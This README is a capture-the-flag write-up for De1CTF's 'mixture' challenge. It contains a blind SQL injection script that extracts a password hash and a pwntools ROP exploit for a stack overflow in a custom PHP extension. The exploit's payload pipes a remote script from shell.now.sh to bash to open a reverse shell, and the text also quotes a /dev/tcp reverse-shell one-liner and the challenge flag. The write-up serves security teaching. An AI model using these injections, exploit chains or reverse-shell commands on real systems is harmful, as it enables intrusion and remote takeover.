[中文](./readme_zh.md) | [English](./readme.md)

# mixture

After logging in, I found that member.php has \ <!-orderby-\> prompt, guessing that there is orderby injection. After a simple attempt, I found that when orderby = | 2, the displayed page is different. The injection script is as follows

```python
import requests

url = "http://49.51.251.99/index.php"
data = {
    "username":"xxxxx",
    "password":"xxxxxxx",
    "submit":"submit"
}
cookie ={
    "PHPSESSID": "sou26piclav6f99h79k1l5vmbn"
}
requests.post(url,data=data,cookies=cookie)
flag=''
url="http://49.51.251.99/member.php?orderby="
for i in range(1,33):
    for j in '0123456789abcdefghijklmnopqrstuvwxyz,':
        payload="|(mid((select password from member),{},1)='{}')%2b1".format(i,j)
        true_url=url+payload
        r=requests.get(true_url,cookies=cookie)
        if r.content.index('tom')<r.content.index('1000000'):
            print payload+' ok'
            flag+=j
            print flag
            break
        else:
            print payload
//18a960a3a0b3554b314ebe77fe545c85 
```

And password is md5 encrypted，After decryption, the password is `goodlucktoyou`

Minclude.so is a php extension written by the author.The function Minclude in search.php corresponds to zip_Minclude() in Minclude.so

Decompile the zip_Minclude you will find nothing here. Read the assembly you will find some easy junk instruction. Nop these codes and then you can decompile it.

```C
void __fastcall zif_Minclude(zend_execute_data *execute_data, zval *return_value)
{
  FILE *fp; // rbx
  unsigned int v3; // eax
  zend_value v4; // rax
  char *parameter; // [rsp+0h] [rbp-98h]
  size_t length; // [rsp+8h] [rbp-90h]
  char path[96]; // [rsp+10h] [rbp-88h]
  int v8; // [rsp+70h] [rbp-28h]
  char *v9; // [rsp+74h] [rbp-24h]

  parameter = 0LL;
  memset(path, 0, sizeof(path));
  v8 = 0;
  v9 = path;
  if ( (unsigned int)zend_parse_parameters(execute_data->This.u2.next, "s", &parameter, &length) != -1 )
  {
    memcpy(path, parameter, length);
    php_printf("%s", path);
    php_printf("<br>");
    fp = fopen(path, "rb");
    if ( fp )
    {
      while ( !feof(fp) )
      {
        v3 = fgetc(fp);
        php_printf("%c", v3);
      }
      php_printf("\n");
    }
    else
    {
      php_printf("no file\n");
    }
    v4.lval = zend_strpprintf(0LL, "True");
    return_value->value = v4;
    return_value->u1.type_info = (*(_BYTE *)(v4.lval + 5) & 2u) < 1 ? 5126 : 6;
  }
}
```

The function is very simple. `end_parse_parrmeters`will parse the parameters, the "s" specifies the type of the parameters is a string. 

Then copy the parameter into a variable on the stack. The length may bigger than path buffer size which may lead to stack overflow, and you can call `system` to reverse a shell.

v9 under the `path`  stores the address of the `path`, which is used to simplify the exploit. You can leak this address easily.

This function's purpose is to read any file and print on the website, so you can read /proc/self/maps and get the address of libc, and then you can ROP.

When the function returns, the stack will be balanced. When the function returns, the stack will be balanced. Later, when fork is called in the system function, the content below rsp will not be copied. So you shouldn't write the string here, but after the return address.

I don't know why `/bin/bash -i >& /dev/tcp/XXX.XXX.XXX.XXX/XXXX 0>&1` can't reverse a shell, you can do other way.

Notice that the address of the `path` is smaller than `rsp` when return, and next call `system` may cover it, so you should put your command behind.

```python
#!/usr/bin/python3
from pwn import *
import requests
import urllib
import struct

url = "http://134.175.185.244/select.php"
url = "http://49.51.251.99/select.php"
data = {
    "username":"admin",
    "password":"goodlucktoyou",
    "submit":"submit"
}
cookie ={
    "PHPSESSID": "p51gfmno1tv687igcc1ndq14vh"
}
res = requests.post(url,data=data,cookies=cookie)
print(res.status_code)
data = {
    'search':"a"*100,
    'submit':"submit"
}

res = requests.post(url,data=data,cookies=cookie)
print(res.content)
res = res.content.split(b'a'*100)[1]
stack = res[0:6]+b'\x00\x00'
stack = struct.unpack('<Q', stack)[0]
print("[+] stack:", hex(stack))

data = {
    'search': "/proc/self/maps", 
    'submit':"submit"
}
res = requests.post(url,data=data,cookies=cookie).content.split(b"\n")
for i in res:
    if b"libc-2.28.so" in i:
        libc_base = int(b"0x" + i[0:12], 16)
        break
print("[+] libc_base:", hex(libc_base))

bss_str = libc_base + 0x0000000001C0000
pop_rdi_ret = libc_base + 0x0000000000023a5f
read = libc_base + 0x00000000000EA450
system = libc_base + 0x00000000000449C0

payload = b"a"*136
payload += p64(pop_rdi_ret) + p64(stack+136+24) + p64(system) + b"curl https://shell.now.sh/xxx.xxx.xxx.xxx:xxxx|bash\x00"

data = {
    'search':payload, 
    'submit':"submit"
}
try:
    res = requests.post(url,data=data,cookies=cookie)
except:
    pass
```

After getting the shell, execute / readflag and calculate the value of the expression to get the flag

> De1CTF{47ae3396-f5ce-47ab-bb64-34b5154064c4}

